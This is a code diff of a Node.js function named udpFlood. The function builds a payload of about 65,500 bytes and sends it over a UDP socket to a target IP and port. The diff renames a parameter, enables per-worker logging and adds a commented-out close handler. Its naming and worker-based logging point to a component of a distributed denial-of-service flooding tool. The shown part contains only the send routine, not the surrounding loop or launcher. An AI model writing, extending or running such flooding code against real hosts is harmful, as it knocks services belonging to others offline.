@@ -1,8 +1,7 @@
 let dgram = require('dgram');
 
-function udpFlood(ips, port, timeout, pid) {
+function udpFlood(ip, port, timeout, pid) {
     return new Promise((resolve, reject) => {
-        let HOST = ips;
         let output = "";
 
         for (let i = 65500; i >= 0; i--) {
@@ -12,16 +11,20 @@ function udpFlood(ips, port, timeout, pid) {
         let socket = dgram.createSocket('udp4');
         let message = Buffer.from(output);
 
-        socket.send(message, 0, message.length, port, HOST, function (err, bytes) {
+        socket.send(message, 0, message.length, port, ip, function (err, bytes) {
             if (err) throw err;
-            // console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes to ' + HOST + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
-            resolve([pid, bytes, HOST, port, socket.address().address, socket.address().port]);
+            console.log('Worker pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes to ' + ip + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
+            resolve();
         });
 
         socket.on('error', (err, rinfo) => {
             reject(err);
             // console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
         });
+        // socket.on("close", function () {
+        //     console.log("socket closed");
+        //     process.exit(-1);
+        // });
     });
 }
 
